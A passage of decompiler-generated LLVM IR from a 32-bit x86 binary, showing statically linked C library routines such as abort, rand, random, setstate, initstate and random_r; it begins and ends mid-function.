  %v12_80536da = ptrtoint i32* %stack_var_-284 to i32
  store i32 31, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80536df

dec_label_pc_80536df:                             ; preds = %dec_label_pc_80536df.dec_label_pc_80536df_crit_edge, %entry
  %v0_80536df = phi i32 [ %v12_80536da, %entry ], [ %v0_80536df.pre, %dec_label_pc_80536df.dec_label_pc_80536df_crit_edge ]
  %v1_80536ea19 = phi i32 [ 31, %entry ], [ %v1_80536ea, %dec_label_pc_80536df.dec_label_pc_80536df_crit_edge ]
  %v2_80536df = mul i32 %v1_80536ea19, 4
  %v3_80536df = add i32 %v2_80536df, 152
  %v4_80536df = add i32 %v3_80536df, %v0_80536df
  %v5_80536df = inttoptr i32 %v4_80536df to i32*
  store i32 0, i32* %v5_80536df, align 4
  %v0_80536ea.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_80536ea = add i32 %v0_80536ea.pre, -1
  %v9_80536ea = icmp slt i32 %v1_80536ea, 0
  store i32 %v1_80536ea, i32* %eax.global-to-local, align 4
  %v1_80536eb = icmp eq i1 %v9_80536ea, false
  br i1 %v1_80536eb, label %dec_label_pc_80536df.dec_label_pc_80536df_crit_edge, label %dec_label_pc_80536ed

dec_label_pc_80536df.dec_label_pc_80536df_crit_edge: ; preds = %dec_label_pc_80536df
  %v0_80536df.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80536df

dec_label_pc_80536ed:                             ; preds = %dec_label_pc_80536df
  %v0_80536ed = load i32, i32* @ebx, align 4
  %v2_80536f1 = ptrtoint i32* %stack_var_-132 to i32
  store i32 %v2_80536f1, i32* @ebx, align 4
  %v4_80536f9 = call i32 @__sigaddset(i32 %v2_80536f1, i32 6, i32 %v0_80536ed, i32 %v0_80536ed)
  store i32 %v4_80536f9, i32* %eax.global-to-local, align 4
  %v1_8053701 = icmp eq i32 %v4_80536f9, 0
  %v1_8053703 = icmp eq i1 %v1_8053701, false
  br i1 %v1_8053703, label %dec_label_pc_8053713, label %dec_label_pc_8053705

dec_label_pc_8053705:                             ; preds = %dec_label_pc_80536ed
  %v3_805370b = bitcast i32* %stack_var_-132 to %_TYPEDEF_sigset_t*
  %v4_805370b = call i32 @__GI_sigprocmask(i32 1, %_TYPEDEF_sigset_t* %v3_805370b, i32 0)
  store i32 %v4_805370b, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053713

dec_label_pc_8053713:                             ; preds = %dec_label_pc_80536ed, %dec_label_pc_8053705
  %v2_805374b4 = phi i32 [ %v4_80536f9, %dec_label_pc_80536ed ], [ %v4_805370b, %dec_label_pc_8053705 ]
  %v0_8053713 = load i8, i8* @global_var_80687c0.752, align 64
  %v1_8053713 = icmp eq i8 %v0_8053713, 0
  %v1_805371a = icmp eq i1 %v1_8053713, false
  br i1 %v1_805371a, label %dec_label_pc_805374b, label %dec_label_pc_805371c

dec_label_pc_805371c:                             ; preds = %dec_label_pc_8053713
  store i8 1, i8* @global_var_80687c0.752, align 64
  br label %dec_label_pc_8053723

dec_label_pc_8053723:                             ; preds = %dec_label_pc_805378a, %dec_label_pc_805371c
  %v1_805372b = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8062448.751 to i32))
  store i32 %v1_805372b, i32* %eax.global-to-local, align 4
  %v1_8053737 = call i32 @__raise(i32 6)
  store i32 %v1_8053737, i32* %eax.global-to-local, align 4
  %v1_8053743 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8062448.751 to i32))
  store i32 %v1_8053743, i32* %eax.global-to-local, align 4
  %v0_805374b.pre = load i8, i8* @global_var_80687c0.752, align 64
  br label %dec_label_pc_805374b

dec_label_pc_805374b:                             ; preds = %dec_label_pc_8053713, %dec_label_pc_8053723
  %v2_805374b = phi i32 [ %v2_805374b4, %dec_label_pc_8053713 ], [ %v1_8053743, %dec_label_pc_8053723 ]
  %v0_805374b = phi i8 [ %v0_8053713, %dec_label_pc_8053713 ], [ %v0_805374b.pre, %dec_label_pc_8053723 ]
  %v1_805374b = zext i8 %v0_805374b to i32
  %v3_805374b = and i32 %v2_805374b, -256
  %v4_805374b = or i32 %v1_805374b, %v3_805374b
  store i32 %v4_805374b, i32* %eax.global-to-local, align 4
  %v10_8053750 = icmp eq i8 %v0_805374b, 1
  %v1_8053752 = icmp eq i1 %v10_8053750, false
  br i1 %v1_8053752, label %dec_label_pc_80537ac, label %dec_label_pc_8053754

dec_label_pc_8053754:                             ; preds = %dec_label_pc_805374b
  %v2_805375c = ptrtoint i32* %stack_var_-272 to i32
  store i32 %v2_805375c, i32* %eax.global-to-local, align 4
  store i8 2, i8* @global_var_80687c0.752, align 64
  %v3_8053768 = bitcast i32* %stack_var_-272 to i8*
  %v4_8053768 = call i32 @__GI_memset(i8* %v3_8053768, i32 0, i32 140)
  store i32 0, i32* %stack_var_-272, align 4
  store i32 31, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805377f

dec_label_pc_805377f:                             ; preds = %dec_label_pc_805377f.dec_label_pc_805377f_crit_edge, %dec_label_pc_8053754
  %v0_805377f = phi i32 [ %v12_80536da, %dec_label_pc_8053754 ], [ %v0_805377f.pre, %dec_label_pc_805377f.dec_label_pc_805377f_crit_edge ]
  %v1_805378718 = phi i32 [ 31, %dec_label_pc_8053754 ], [ %v1_8053787, %dec_label_pc_805377f.dec_label_pc_805377f_crit_edge ]
  %v2_805377f = mul i32 %v1_805378718, 4
  %v3_805377f = add i32 %v2_805377f, 16
  %v4_805377f = add i32 %v3_805377f, %v0_805377f
  %v5_805377f = inttoptr i32 %v4_805377f to i32*
  store i32 -1, i32* %v5_805377f, align 4
  %v0_8053787.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_8053787 = add i32 %v0_8053787.pre, -1
  %v9_8053787 = icmp slt i32 %v1_8053787, 0
  store i32 %v1_8053787, i32* %eax.global-to-local, align 4
  %v1_8053788 = icmp eq i1 %v9_8053787, false
  br i1 %v1_8053788, label %dec_label_pc_805377f.dec_label_pc_805377f_crit_edge, label %dec_label_pc_805378a

dec_label_pc_805377f.dec_label_pc_805377f_crit_edge: ; preds = %dec_label_pc_805377f
  %v0_805377f.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_805377f

dec_label_pc_805378a:                             ; preds = %dec_label_pc_805377f
  store i32 %v2_805375c, i32* %eax.global-to-local, align 4
  %v4_805379f = call i32 @__libc_sigaction(i32 6, i32* nonnull %stack_var_-272, i32 0)
  store i32 %v4_805379f, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053723

dec_label_pc_80537ac:                             ; preds = %dec_label_pc_805374b
  %v10_80537ac = icmp eq i8 %v0_805374b, 2
  %v1_80537ae = icmp eq i1 %v10_80537ac, false
  br i1 %v1_80537ae, label %dec_label_pc_80537b8, label %dec_label_pc_80537b0

dec_label_pc_80537b0:                             ; preds = %dec_label_pc_80537ac
  store i8 3, i8* @global_var_80687c0.752, align 64
  br label %dec_label_pc_80537b8

dec_label_pc_80537b8:                             ; preds = %dec_label_pc_80537ac, %dec_label_pc_80537b0
  %v0_80537b8 = phi i8 [ %v0_805374b, %dec_label_pc_80537ac ], [ 3, %dec_label_pc_80537b0 ]
  %v9_80537b8 = icmp eq i8 %v0_80537b8, 3
  %v1_80537bf = icmp eq i1 %v9_80537b8, false
  br i1 %v1_80537bf, label %dec_label_pc_80537d2, label %dec_label_pc_80537c1

dec_label_pc_80537c1:                             ; preds = %dec_label_pc_80537b8
  store i8 4, i8* @global_var_80687c0.752, align 64
  %v1_80537cd = call i32 @__GI__exit(i32 127)
  unreachable

dec_label_pc_80537d2:                             ; preds = %dec_label_pc_80537b8, %dec_label_pc_80537d2
  br label %dec_label_pc_80537d2

; uselistorder directives
  uselistorder i32 %v1_8053787, { 2, 1, 0 }
  uselistorder i8 %v0_805374b, { 2, 0, 1, 3 }
  uselistorder i32 %v1_80536ea, { 2, 1, 0 }
  uselistorder i32* %stack_var_-272, { 0, 2, 1, 3 }
  uselistorder i32* %eax.global-to-local, { 2, 3, 5, 4, 0, 6, 7, 8, 9, 10, 11, 12, 14, 13, 1 }
  uselistorder i8 3, { 0, 4, 6, 1, 2, 5, 3 }
  uselistorder i8* @global_var_80687c0.752, { 5, 4, 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_80537d2, { 1, 0 }
  uselistorder label %dec_label_pc_80537b8, { 1, 0 }
  uselistorder label %dec_label_pc_805374b, { 1, 0 }
  uselistorder label %dec_label_pc_8053713, { 1, 0 }
}

define i32 @rand() local_unnamed_addr {
entry:
  %v0_80537d8 = call i32 @random()
  ret i32 %v0_80537d8

; uselistorder directives
  uselistorder i32 ()* @random, { 13, 1, 10, 6, 9, 0, 11, 7, 5, 12, 2, 3, 8, 4 }
}

define i32 @random() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80537e0 = load i32, i32* @ebx, align 4
  store i32 %v0_80537e0, i32* %stack_var_-4, align 4
  %v2_80537ee = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_80537ee, i32* @ebx, align 4
  %v2_80537f3 = call i32 @__pthread_return_void(i32 %v2_80537ee, i32 134562299)
  %v1_80537ff = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8062460.753 to i32))
  %v2_8053806 = ptrtoint i32* %stack_var_-8 to i32
  %v3_8053810 = call i32 @__GI_random_r(i32* nonnull @global_var_8062478, i32 %v2_8053806)
  store i32 ptrtoint (i32* @global_var_8062478 to i32), i32* @eax, align 4
  %v2_805381a = call i32 @__pthread_return_void(i32 %v2_80537ee, i32 1)
  %v3_805381f = load i32, i32* %stack_var_-8, align 4
  %v2_8053826 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8053826, i32* @ebx, align 4
  ret i32 %v3_805381f
}

define i32 @setstate(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  store i32 0, i32* @esi, align 4
  %v2_8053839 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8053839, i32* @eax, align 4
  %v2_805383e = call i32 @__pthread_return_void(i32 %v2_8053839, i32 134562299)
  %v1_805384a = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8062460.753 to i32))
  %v0_805384f = load i32, i32* bitcast (i32** @global_var_8062480.756 to i32*), align 128
  store i32 %v0_805384f, i32* @ebx, align 4
  %v3_8053860 = call i32 @setstate_r(i32 %arg1, i32* nonnull @global_var_8062478)
  %v2_8053868 = icmp slt i32 %v3_8053860, 0
  br i1 %v2_8053868, label %dec_label_pc_805386f, label %dec_label_pc_805386c

dec_label_pc_805386c:                             ; preds = %entry
  store i32 ptrtoint (i32** @global_var_806247c.757 to i32), i32* @esi, align 4
  br label %dec_label_pc_805386f

dec_label_pc_805386f:                             ; preds = %entry, %dec_label_pc_805386c
  store i32 %v2_8053839, i32* @eax, align 4
  %v2_8053878 = call i32 @__pthread_return_void(i32 %v2_8053839, i32 1)
  %v0_8053880 = load i32, i32* @esi, align 4
  ret i32 %v0_8053880

; uselistorder directives
  uselistorder label %dec_label_pc_805386f, { 1, 0 }
}

define i32 @initstate(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  %v2_8053894 = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8053894, i32* @ebx, align 4
  %v2_8053899 = call i32 @__pthread_return_void(i32 %v2_8053894, i32 134562299)
  %v1_80538a5 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8062460.753 to i32))
  store i32 ptrtoint (i32** @global_var_806247c.757 to i32), i32* @esi, align 4
  %v4_80538c4 = inttoptr i32 %arg2 to i32*
  %v5_80538c4 = call i32 @__GI_initstate_r(i32 %arg1, i32* %v4_80538c4, i32 %arg3, i32 ptrtoint (i32* @global_var_8062478 to i32))
  store i32 %v5_80538c4, i32* @eax, align 4
  %v2_80538cf = call i32 @__pthread_return_void(i32 %v2_8053894, i32 1)
  %v0_80538d7 = load i32, i32* @esi, align 4
  ret i32 %v0_80538d7
}

define i32 @srand(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80538dc = load i32, i32* @ebx, align 4
  store i32 %v0_80538dc, i32* %stack_var_-4, align 4
  %v2_80538ea = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_80538ea, i32* @ebx, align 4
  %v2_80538ef = call i32 @__pthread_return_void(i32 %v2_80538ea, i32 134562299)
  %v1_80538fb = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_8062460.753 to i32))
  %v3_805390b = call i32 @srandom_r(i32 %arg1, i32* nonnull @global_var_8062478)
  store i32 ptrtoint (i32* @global_var_8062478 to i32), i32* @eax, align 4
  %v2_8053915 = call i32 @__pthread_return_void(i32 %v2_80538ea, i32 1)
  %v2_805391d = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_805391d, i32* @ebx, align 4
  ret i32 %v2_8053915

; uselistorder directives
  uselistorder i32 ptrtoint (i32* @global_var_8062478 to i32), { 1, 2, 0 }
  uselistorder i32* @global_var_8062478, { 0, 1, 3, 2 }
}

define i32 @setstate_r(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp3 = ptrtoint i32* %arg2 to i32
  %v0_8053923 = load i32, i32* @ebx, align 4
  store i32 %tmp3, i32* %ebx.global-to-local, align 4
  store i32 %arg1, i32* %esi.global-to-local, align 4
  %v1_805392f = add i32 %tmp3, 12
  %v2_805392f = inttoptr i32 %v1_805392f to i32*
  %v3_805392f = load i32, i32* %v2_805392f, align 4
  store i32 %v3_805392f, i32* %ecx.global-to-local, align 4
  %v1_8053932 = add i32 %arg1, 4
  store i32 %v1_8053932, i32* %esi.global-to-local, align 4
  %v1_8053935 = add i32 %tmp3, 8
  %v2_8053935 = inttoptr i32 %v1_8053935 to i32*
  %v3_8053935 = load i32, i32* %v2_8053935, align 4
  %v1_8053938 = icmp eq i32 %v3_805392f, 0
  %v1_805393a = icmp eq i1 %v1_8053938, false
  br i1 %v1_805393a, label %dec_label_pc_8053945, label %dec_label_pc_805393c

dec_label_pc_805393c:                             ; preds = %entry
  %v1_805393c = add i32 %v3_8053935, -4
  %v2_805393c = inttoptr i32 %v1_805393c to i32*
  store i32 0, i32* %v2_805393c, align 4
  br label %dec_label_pc_8053955

dec_label_pc_8053945:                             ; preds = %entry
  %v1_8053945 = add i32 %tmp3, 4
  %v2_8053945 = inttoptr i32 %v1_8053945 to i32*
  %v3_8053945 = load i32, i32* %v2_8053945, align 4
  %v2_8053948 = sub i32 %v3_8053945, %v3_8053935
  %v2_805394a = sdiv i32 %v2_8053948, 4
  %v3_805394d = mul i32 %v2_805394a, 5
  %v2_8053950 = add i32 %v3_805394d, %v3_805392f
  store i32 %v2_8053950, i32* %eax.global-to-local, align 4
  %v2_8053952 = add i32 %v3_8053935, -4
  %v3_8053952 = inttoptr i32 %v2_8053952 to i32*
  store i32 %v2_8053950, i32* %v3_8053952, align 4
  br label %dec_label_pc_8053955

dec_label_pc_8053955:                             ; preds = %dec_label_pc_805393c, %dec_label_pc_8053945
  %v0_8053955 = load i32, i32* %esi.global-to-local, align 4
  %v1_8053955 = add i32 %v0_8053955, -4
  %v2_8053955 = inttoptr i32 %v1_8053955 to i32*
  %v3_8053955 = load i32, i32* %v2_8053955, align 4
  store i32 5, i32* %edi.global-to-local, align 4
  %v1_805395d = ashr i32 %v3_8053955, 31
  %v2_805395e = zext i32 %v3_8053955 to i64
  %v4_805395e = zext i32 %v1_805395d to i64
  %v5_805395e = mul nuw i64 %v4_805395e, 4294967296
  %v6_805395e = or i64 %v5_805395e, %v2_805395e
  %v8_805395e = sdiv i64 %v6_805395e, 5
  %v9_805395e = trunc i64 %v8_805395e to i32
  store i32 %v9_805395e, i32* %eax.global-to-local, align 4
  %v10_805395e = srem i64 %v6_805395e, 5
  %v11_805395e = trunc i64 %v10_805395e to i32
  %v6_8053963 = icmp ugt i32 %v11_805395e, 4
  br i1 %v6_8053963, label %dec_label_pc_80539a3, label %dec_label_pc_8053965

dec_label_pc_8053965:                             ; preds = %dec_label_pc_8053955
  %v1_8053965 = mul i32 %v11_805395e, 4
  %v2_8053965 = add i32 %v1_8053965, ptrtoint (i32* @global_var_80610d4.758 to i32)
  %v3_8053965 = inttoptr i32 %v2_8053965 to i32*
  %v4_8053965 = load i32, i32* %v3_8053965, align 4
  store i32 %v4_8053965, i32* %ecx.global-to-local, align 4
  %v1_805396c = icmp eq i32 %v11_805395e, 0
  %v2_805396e = add i32 %v1_8053965, ptrtoint (i32* @global_var_80610c0.759 to i32)
  %v3_805396e = inttoptr i32 %v2_805396e to i32*
  %v4_805396e = load i32, i32* %v3_805396e, align 4
  store i32 %v4_805396e, i32* %ebp.global-to-local, align 4
  %v1_8053975 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8053975 = add i32 %v1_8053975, 12
  %v3_8053975 = inttoptr i32 %v2_8053975 to i32*
  store i32 %v11_805395e, i32* %v3_8053975, align 4
  %v0_8053978 = load i32, i32* %ecx.global-to-local, align 4
  %v1_8053978 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8053978 = add i32 %v1_8053978, 16
  %v3_8053978 = inttoptr i32 %v2_8053978 to i32*
  store i32 %v0_8053978, i32* %v3_8053978, align 4
  %v0_805397b = load i32, i32* %ebp.global-to-local, align 4
  %v1_805397b = load i32, i32* %ebx.global-to-local, align 4
  %v2_805397b = add i32 %v1_805397b, 20
  %v3_805397b = inttoptr i32 %v2_805397b to i32*
  store i32 %v0_805397b, i32* %v3_805397b, align 4
  br i1 %v1_805396c, label %dec_label_pc_8053996, label %dec_label_pc_8053980

dec_label_pc_8053980:                             ; preds = %dec_label_pc_8053965
  %v0_8053980 = load i32, i32* %esi.global-to-local, align 4
  %v1_8053980 = add i32 %v0_8053980, -4
  %v2_8053980 = inttoptr i32 %v1_8053980 to i32*
  %v3_8053980 = load i32, i32* %v2_8053980, align 4
  %v1_8053983 = ashr i32 %v3_8053980, 31
  %v0_8053984 = load i32, i32* %edi.global-to-local, align 4
  %v2_8053984 = zext i32 %v3_8053980 to i64
  %v4_8053984 = zext i32 %v1_8053983 to i64
  %v5_8053984 = mul nuw i64 %v4_8053984, 4294967296
  %v6_8053984 = or i64 %v5_8053984, %v2_8053984
  %v7_8053984 = zext i32 %v0_8053984 to i64
  %v8_8053984 = sdiv i64 %v6_8053984, %v7_8053984
  %v9_8053984 = trunc i64 %v8_8053984 to i32
  %v2_8053986 = mul i32 %v9_8053984, 4
  %v3_8053986 = add i32 %v2_8053986, %v0_8053980
  %v1_8053989 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8053989 = add i32 %v1_8053989, %v9_8053984
  store i32 %v2_8053989, i32* %eax.global-to-local, align 4
  %v1_805398b = load i32, i32* %ebx.global-to-local, align 4
  %v2_805398b = add i32 %v1_805398b, 4
  %v3_805398b = inttoptr i32 %v2_805398b to i32*
  store i32 %v3_8053986, i32* %v3_805398b, align 4
  %v0_805398e = load i32, i32* %eax.global-to-local, align 4
  %v1_805398e = ashr i32 %v0_805398e, 31
  %v0_805398f = load i32, i32* %ecx.global-to-local, align 4
  %v2_805398f = zext i32 %v0_805398e to i64
  %v4_805398f = zext i32 %v1_805398e to i64
  %v5_805398f = mul nuw i64 %v4_805398f, 4294967296
  %v6_805398f = or i64 %v5_805398f, %v2_805398f
  %v7_805398f = zext i32 %v0_805398f to i64
  %v8_805398f = sdiv i64 %v6_805398f, %v7_805398f
  %v9_805398f = trunc i64 %v8_805398f to i32
  store i32 %v9_805398f, i32* %eax.global-to-local, align 4
  %v10_805398f = srem i64 %v6_805398f, %v7_805398f
  %v11_805398f = trunc i64 %v10_805398f to i32
  %v0_8053991 = load i32, i32* %esi.global-to-local, align 4
  %v2_8053991 = mul i32 %v11_805398f, 4
  %v3_8053991 = add i32 %v2_8053991, %v0_8053991
  %v1_8053994 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8053994 = inttoptr i32 %v1_8053994 to i32*
  store i32 %v3_8053991, i32* %v2_8053994, align 4
  br label %dec_label_pc_8053996

dec_label_pc_8053996:                             ; preds = %dec_label_pc_8053965, %dec_label_pc_8053980
  %v0_8053996 = load i32, i32* %esi.global-to-local, align 4
  %v1_8053996 = load i32, i32* %ecx.global-to-local, align 4
  %v2_8053996 = mul i32 %v1_8053996, 4
  %v3_8053996 = add i32 %v2_8053996, %v0_8053996
  %v1_8053999 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8053999 = add i32 %v1_8053999, 24
  %v3_8053999 = inttoptr i32 %v2_8053999 to i32*
  store i32 %v3_8053996, i32* %v3_8053999, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_805399e = load i32, i32* %esi.global-to-local, align 4
  %v1_805399e = load i32, i32* %ebx.global-to-local, align 4
  %v2_805399e = add i32 %v1_805399e, 8
  %v3_805399e = inttoptr i32 %v2_805399e to i32*
  store i32 %v0_805399e, i32* %v3_805399e, align 4
  %v0_80539b8.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80539b1

dec_label_pc_80539a3:                             ; preds = %dec_label_pc_8053955
  %v1_80539a3 = call i32 @__errno_location(i32 %v0_8053923)
  %v1_80539a8 = inttoptr i32 %v1_80539a3 to i32*
  store i32 22, i32* %v1_80539a8, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80539b1

dec_label_pc_80539b1:                             ; preds = %dec_label_pc_8053996, %dec_label_pc_80539a3
  %v0_80539b8 = phi i32 [ %v0_80539b8.pre, %dec_label_pc_8053996 ], [ -1, %dec_label_pc_80539a3 ]
  store i32 %v0_8053923, i32* %ebx.global-to-local, align 4
  ret i32 %v0_80539b8

; uselistorder directives
  uselistorder i32 %v11_805395e, { 1, 3, 2, 0 }
  uselistorder i32 %tmp3, { 0, 1, 3, 2 }
  uselistorder i64 5, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80539b1, { 1, 0 }
  uselistorder label %dec_label_pc_8053996, { 1, 0 }
  uselistorder label %dec_label_pc_8053955, { 1, 0 }
}

define i32 @__GI_random_r(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp3 = ptrtoint i32* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v0_80539bc = load i32, i32* @ebx, align 4
  store i32 %v0_80539bc, i32* %stack_var_-16, align 4
  store i32 %tmp3, i32* %ebx.global-to-local, align 4
  store i32 %arg2, i32* %ebp.global-to-local, align 4
  %v1_80539c5 = add i32 %tmp3, 12
  %v2_80539c5 = inttoptr i32 %v1_80539c5 to i32*
  %v3_80539c5 = load i32, i32* %v2_80539c5, align 4
  %v4_80539c5 = icmp eq i32 %v3_80539c5, 0
  %v1_80539c9 = add i32 %tmp3, 8
  %v2_80539c9 = inttoptr i32 %v1_80539c9 to i32*
  %v3_80539c9 = load i32, i32* %v2_80539c9, align 4
  store i32 %v3_80539c9, i32* %esi.global-to-local, align 4
  %v1_80539cc = icmp eq i1 %v4_80539c5, false
  br i1 %v1_80539cc, label %dec_label_pc_80539e5, label %dec_label_pc_80539ce

dec_label_pc_80539ce:                             ; preds = %entry
  %v2_80539ce = inttoptr i32 %v3_80539c9 to i32*
  %v3_80539ce = load i32, i32* %v2_80539ce, align 4
  %v5_80539ce = mul i32 %v3_80539ce, 1103515245
  %v1_80539d4 = add i32 %v5_80539ce, 12345
  %v1_80539d9 = urem i32 %v1_80539d4, -2147483648
  store i32 %v1_80539d9, i32* %eax.global-to-local, align 4
  store i32 %v1_80539d9, i32* %v2_80539ce, align 4
  %v0_80539e0 = load i32, i32* %eax.global-to-local, align 4
  %v1_80539e0 = load i32, i32* %ebp.global-to-local, align 4
  %v2_80539e0 = inttoptr i32 %v1_80539e0 to i32*
  store i32 %v0_80539e0, i32* %v2_80539e0, align 4
  br label %dec_label_pc_8053a10

dec_label_pc_80539e5:                             ; preds = %entry
  %v1_80539e5 = add i32 %tmp3, 4
  %v2_80539e5 = inttoptr i32 %v1_80539e5 to i32*
  %v3_80539e5 = load i32, i32* %v2_80539e5, align 4
  store i32 %v3_80539e5, i32* %ecx.global-to-local, align 4
  %v2_80539e8 = load i32, i32* %arg1, align 4
  store i32 %v2_80539e8, i32* %edx.global-to-local, align 4
  %v1_80539ea = add i32 %tmp3, 24
  %v2_80539ea = inttoptr i32 %v1_80539ea to i32*
  %v3_80539ea = load i32, i32* %v2_80539ea, align 4
  store i32 %v3_80539ea, i32* %edi.global-to-local, align 4
  %v1_80539ed = inttoptr i32 %v3_80539e5 to i32*
  %v2_80539ed = load i32, i32* %v1_80539ed, align 4
  store i32 %v2_80539ed, i32* %eax.global-to-local, align 4
  %v1_80539ef = inttoptr i32 %v2_80539e8 to i32*
  %v2_80539ef = load i32, i32* %v1_80539ef, align 4
  %v4_80539ef = add i32 %v2_80539ef, %v2_80539ed
  store i32 %v4_80539ef, i32* %v1_80539ef, align 4
  %v0_80539f1 = load i32, i32* %edx.global-to-local, align 4
  %v1_80539f1 = inttoptr i32 %v0_80539f1 to i32*
  %v2_80539f1 = load i32, i32* %v1_80539f1, align 4
  %v1_80539f3 = add i32 %v0_80539f1, 4
  store i32 %v1_80539f3, i32* %edx.global-to-local, align 4
  %v2_80539f6 = udiv i32 %v2_80539f1, 2
  %v1_80539f8 = load i32, i32* %edi.global-to-local, align 4
  %v7_80539f8 = icmp ult i32 %v1_80539f3, %v1_80539f8
  %v1_80539fa = load i32, i32* %ebp.global-to-local, align 4
  %v2_80539fa = inttoptr i32 %v1_80539fa to i32*
  store i32 %v2_80539f6, i32* %v2_80539fa, align 4
  %v0_80539fd = load i32, i32* %ecx.global-to-local, align 4
  %v1_80539fd = add i32 %v0_80539fd, 4
  store i32 %v1_80539fd, i32* %eax.global-to-local, align 4
  br i1 %v7_80539f8, label %dec_label_pc_8053a06, label %dec_label_pc_8053a02

dec_label_pc_8053a02:                             ; preds = %dec_label_pc_80539e5
  %v0_8053a02 = load i32, i32* %esi.global-to-local, align 4
  store i32 %v0_8053a02, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8053a0b

dec_label_pc_8053a06:                             ; preds = %dec_label_pc_80539e5
  %v1_8053a06 = load i32, i32* %edi.global-to-local, align 4
  %v7_8053a06 = icmp ult i32 %v1_80539fd, %v1_8053a06
  %v1_8053a08 = icmp eq i1 %v7_8053a06, false
  %v3_8053a08 = load i32, i32* %esi.global-to-local, align 4
  %v4_8053a08 = select i1 %v1_8053a08, i32 %v3_8053a08, i32 %v1_80539fd
  store i32 %v4_8053a08, i32* %eax.global-to-local, align 4
  %v0_8053a0b.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8053a0b

dec_label_pc_8053a0b:                             ; preds = %dec_label_pc_8053a02, %dec_label_pc_8053a06
  %v0_8053a0b = phi i32 [ %v0_8053a02, %dec_label_pc_8053a02 ], [ %v0_8053a0b.pre, %dec_label_pc_8053a06 ]
  %v1_8053a0b = load i32, i32* %ebx.global-to-local, align 4
  %v2_8053a0b = inttoptr i32 %v1_8053a0b to i32*
  store i32 %v0_8053a0b, i32* %v2_8053a0b, align 4
  %v0_8053a0d = load i32, i32* %eax.global-to-local, align 4
  %v1_8053a0d = load i32, i32* %ebx.global-to-local, align 4
  %v2_8053a0d = add i32 %v1_8053a0d, 4
  %v3_8053a0d = inttoptr i32 %v2_8053a0d to i32*
  store i32 %v0_8053a0d, i32* %v3_8053a0d, align 4
  br label %dec_label_pc_8053a10

dec_label_pc_8053a10:                             ; preds = %dec_label_pc_80539ce, %dec_label_pc_8053a0b
  %v2_8053a10 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8053a10, i32* @ebx, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_80539d9, { 1, 0 }
  uselistorder i32 %tmp3, { 0, 1, 2, 4, 3 }
  uselistorder i32* %edx.global-to-local, { 1, 0, 2, 3, 4 }
  uselistorder i32* %eax.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_8053a10, { 1, 0 }
  uselistorder label %dec_label_pc_8053a0b, { 1, 0 }
}

define i32 @srandom_r(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp14 = ptrtoint i32* %arg2 to i32
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-40 = alloca i64, align 8
  %v0_8053a17 = load i32, i32* @ebp, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  %v0_8053a1b = load i32, i32* @edi, align 4
  %v0_8053a1c = load i32, i32* @esi, align 4
  %v0_8053a1d = load i32, i32* @ebx, align 4
  store i32 %tmp14, i32* @esi, align 4
  store i32 %arg1, i32* %edx.global-to-local, align 4
  %v1_8053a29 = add i32 %tmp14, 12
